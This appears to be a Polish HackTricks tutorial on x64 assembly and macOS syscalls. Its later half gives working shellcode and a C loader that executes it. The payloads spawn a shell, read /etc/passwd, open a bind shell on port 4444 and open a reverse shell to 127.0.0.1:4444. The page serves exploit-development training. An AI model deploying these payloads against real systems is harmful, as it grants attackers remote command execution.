# Wprowadzenie do x64

{{#include ../../../banners/hacktricks-training.md}}

## **Wprowadzenie do x64**

x64, znana również jako x86-64, to architektura procesora 64-bitowego, głównie używana w komputerach stacjonarnych i serwerach. Pochodzi z architektury x86 produkowanej przez Intel, a później przyjętej przez AMD pod nazwą AMD64, jest to dominująca architektura w komputerach osobistych i serwerach dzisiaj.

### **Rejestry**

x64 rozwija architekturę x86, oferując **16 rejestrów ogólnego przeznaczenia** oznaczonych jako `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, oraz `r8` do `r15`. Każdy z nich może przechowywać wartość **64-bitową** (8-bajtową). Te rejestry mają również podrejestry 32-bitowe, 16-bitowe i 8-bitowe dla zgodności i specyficznych zadań.

1. **`rax`** - Tradycyjnie używany do **wartości zwracanych** z funkcji.
2. **`rbx`** - Często używany jako **rejestr bazowy** dla operacji pamięci.
3. **`rcx`** - Powszechnie używany do **liczników pętli**.
4. **`rdx`** - Używany w różnych rolach, w tym w rozszerzonych operacjach arytmetycznych.
5. **`rbp`** - **Wskaźnik bazowy** dla ramki stosu.
6. **`rsp`** - **Wskaźnik stosu**, śledzący szczyt stosu.
7. **`rsi`** i **`rdi`** - Używane do indeksów **źródłowych** i **docelowych** w operacjach na ciągach/pamięci.
8. **`r8`** do **`r15`** - Dodatkowe rejestry ogólnego przeznaczenia wprowadzone w x64.

### **Konwencja wywołań**

Konwencja wywołań x64 różni się w zależności od systemu operacyjnego. Na przykład:

- **Windows**: Pierwsze **cztery parametry** są przekazywane w rejestrach **`rcx`**, **`rdx`**, **`r8`** i **`r9`**. Dalsze parametry są umieszczane na stosie. Wartość zwracana znajduje się w **`rax`**.
- **System V (powszechnie używany w systemach podobnych do UNIX)**: Pierwsze **sześć parametrów całkowitych lub wskaźnikowych** jest przekazywanych w rejestrach **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** i **`r9`**. Wartość zwracana również znajduje się w **`rax`**.

Jeśli funkcja ma więcej niż sześć argumentów, **pozostałe będą przekazywane na stosie**. **RSP**, wskaźnik stosu, musi być **wyrównany do 16 bajtów**, co oznacza, że adres, na który wskazuje, musi być podzielny przez 16 przed jakimkolwiek wywołaniem. Oznacza to, że normalnie musielibyśmy upewnić się, że RSP jest odpowiednio wyrównany w naszym shellcode przed wykonaniem wywołania funkcji. Jednak w praktyce wywołania systemowe działają wiele razy, nawet jeśli ten wymóg nie jest spełniony.

### Konwencja wywołań w Swift

Swift ma swoją własną **konwencję wywołań**, którą można znaleźć w [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Typowe instrukcje**

Instrukcje x64 mają bogaty zestaw, zachowując zgodność z wcześniejszymi instrukcjami x86 i wprowadzając nowe.

- **`mov`**: **Przenieś** wartość z jednego **rejestru** lub **lokacji pamięci** do innego.
- Przykład: `mov rax, rbx` — Przenosi wartość z `rbx` do `rax`.
- **`push`** i **`pop`**: Umieść lub wyjmij wartości z **stosu**.
- Przykład: `push rax` — Umieszcza wartość w `rax` na stosie.
- Przykład: `pop rax` — Wyjmuje górną wartość ze stosu do `rax`.
- **`add`** i **`sub`**: Operacje **dodawania** i **odejmowania**.
- Przykład: `add rax, rcx` — Dodaje wartości w `rax` i `rcx`, zapisując wynik w `rax`.
- **`mul`** i **`div`**: Operacje **mnożenia** i **dzielenia**. Uwaga: mają one specyficzne zachowania dotyczące użycia operandów.
- **`call`** i **`ret`**: Używane do **wywoływania** i **zwracania z funkcji**.
- **`int`**: Używane do wywoływania oprogramowania **przerwania**. Np. `int 0x80` było używane do wywołań systemowych w 32-bitowym x86 Linux.
- **`cmp`**: **Porównaj** dwie wartości i ustaw flagi CPU na podstawie wyniku.
- Przykład: `cmp rax, rdx` — Porównuje `rax` z `rdx`.
- **`je`, `jne`, `jl`, `jge`, ...**: Instrukcje **skoku warunkowego**, które zmieniają przepływ sterowania na podstawie wyników poprzedniego `cmp` lub testu.
- Przykład: Po instrukcji `cmp rax, rdx`, `je label` — Skacze do `label`, jeśli `rax` jest równy `rdx`.
- **`syscall`**: Używane do **wywołań systemowych** w niektórych systemach x64 (jak nowoczesny Unix).
- **`sysenter`**: Zoptymalizowana instrukcja **wywołania systemowego** na niektórych platformach.

### **Prolog funkcji**

1. **Umieść stary wskaźnik bazowy**: `push rbp` (zapisuje wskaźnik bazowy wywołującego)
2. **Przenieś aktualny wskaźnik stosu do wskaźnika bazowego**: `mov rbp, rsp` (ustawia nowy wskaźnik bazowy dla bieżącej funkcji)
3. **Przydziel miejsce na stosie dla zmiennych lokalnych**: `sub rsp, <size>` (gdzie `<size>` to liczba bajtów potrzebnych)

### **Epilog funkcji**

1. **Przenieś aktualny wskaźnik bazowy do wskaźnika stosu**: `mov rsp, rbp` (zwalnia zmienne lokalne)
2. **Wyjmij stary wskaźnik bazowy ze stosu**: `pop rbp` (przywraca wskaźnik bazowy wywołującego)
3. **Zwróć**: `ret` (zwraca kontrolę do wywołującego)

## macOS

### syscalls

Istnieją różne klasy wywołań systemowych, możesz [**znaleźć je tutaj**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Następnie możesz znaleźć każdy numer syscall [**w tym adresie URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Aby wywołać syscall `open` (**5**) z klasy **Unix/BSD**, musisz dodać: `0x2000000`

Zatem numer syscall do wywołania open to `0x2000005`

### Shellcodes

Aby skompilować:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
Aby wyodrębnić bajty:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>Kod C do testowania shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Pobrane z [**tutaj**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) i wyjaśnione.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="z użyciem stosu"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### Czytaj za pomocą cat

Celem jest wykonanie `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, więc drugi argument (x1) to tablica parametrów (co w pamięci oznacza stos adresów).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Wywołaj polecenie za pomocą sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Bind shell z [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) na **porcie 4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

Reverse shell z [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell do **127.0.0.1:4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
{{#include ../../../banners/hacktricks-training.md}}
